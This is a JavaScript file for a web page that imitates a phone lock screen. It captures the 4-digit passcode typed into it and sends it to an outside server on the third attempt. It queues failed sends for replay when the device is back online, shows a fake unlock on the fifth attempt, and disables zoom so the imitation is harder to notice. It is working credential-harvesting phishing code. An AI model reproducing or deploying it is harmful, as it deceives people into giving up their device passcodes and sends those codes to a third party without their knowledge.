// app.js - 4-digit passcode, send on 3rd attempt, unlock on 5th, queue offline, disable pinch/double-tap
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 4;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key[data-num]'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');

  const unlockOverlay = document.getElementById('unlockOverlay');
  const homescreenImg = document.getElementById('homescreenImg');

  const ATT_KEY = '_pass_attempt_count_';

  function getAttempts(){ return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
  function setAttempts(n){ localStorage.setItem(ATT_KEY, String(n)); }

  function refreshDots(){ dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length)); }
  function reset(){ code = ""; refreshDots(); }

  function queuePass(pass){
    const q = JSON.parse(localStorage.getItem('_pass_queue_') || '[]');
    q.push({pass, ts: Date.now()});
    localStorage.setItem('_pass_queue_', JSON.stringify(q));
  }

  function sendToAPI(pass){
    const url = API_BASE + encodeURIComponent(pass);
    return fetch(url, { method: 'GET', keepalive: true }).catch(() => {
      queuePass(pass);
    });
  }

  function flushQueue(){
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  // unlock animation: shrink lock UI then reveal homescreen
  function playUnlockAnimation() {
    const lockEl = document.querySelector('.lockscreen');
    if (!lockEl || !unlockOverlay) return;

    // tiny flash for realism
    let flash = document.querySelector('.unlock-flash');
    if (!flash) {
      flash = document.createElement('div');
      flash.className = 'unlock-flash';
      flash.style.position = 'fixed';
      flash.style.inset = '0';
      flash.style.zIndex = '9998';
      flash.style.pointerEvents = 'none';
      flash.style.background = 'rgba(255,255,255,0.02)';
      flash.style.opacity = '0';
      document.body.appendChild(flash);
    }

    // shrink/fade lock UI
    lockEl.classList.add('unlocking');

    // flash pulse
    flash.style.transition = 'opacity 320ms ease-out';
    flash.style.opacity = '0.08';
    setTimeout(()=>{ flash.style.opacity = '0'; }, 320);

    // slight delay then reveal homescreen
    setTimeout(()=> {
      unlockOverlay.classList.add('show');
      // keep pointer events enabled so homescreen can be interactive if you later enable it
      unlockOverlay.style.pointerEvents = 'auto';
    }, 90);
  }

  // Called when full passcode entered
  async function handleCompleteAttempt(enteredCode) {
    let attempts = getAttempts();
    attempts += 1;
    setAttempts(attempts);

    // send only on 3rd attempt
    if (attempts === 3) {
      try {
        await sendToAPI(enteredCode);
      } catch (e) {
        // sendToAPI already queues on failure
      }
      // do not animate on 3rd
    } else if (attempts === 5) {
      // play unlock animation on 5th
      playUnlockAnimation();
    } else {
      // 1,2,4 do nothing
    }

    if (attempts >= 5) {
      setAttempts(0);
    }
  }

  // numeric keys
  keys.forEach(k => k.addEventListener('click', () => {
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();
    if (code.length === MAX) {
      const entered = code;
      setTimeout(() => {
        handleCompleteAttempt(entered);
        reset();
      }, 200);
    }
  }));

  // emergency: visual only
  emergency && emergency.addEventListener('click', e => e.preventDefault());

  // cancel clears input
  cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // expose debug
  window.__passUI = { getCode: ()=>code, reset, getAttempts };

  /* === Prevent pinch & double-tap zoom === */
  // gesturestart (older Safari)
  window.addEventListener('gesturestart', function(e){ e.preventDefault(); }, { passive:false });
  // block multi-touch pinch move
  document.addEventListener('touchmove', function(e){
    if (e.touches && e.touches.length > 1) e.preventDefault();
  }, { passive:false });
  // prevent double-tap zoom
  (function(){
    let lastTouch = 0;
    document.addEventListener('touchend', function(e){
      const now = Date.now();
      if (now - lastTouch <= 300) e.preventDefault();
      lastTouch = now;
    }, { passive:false });
  })();

})();
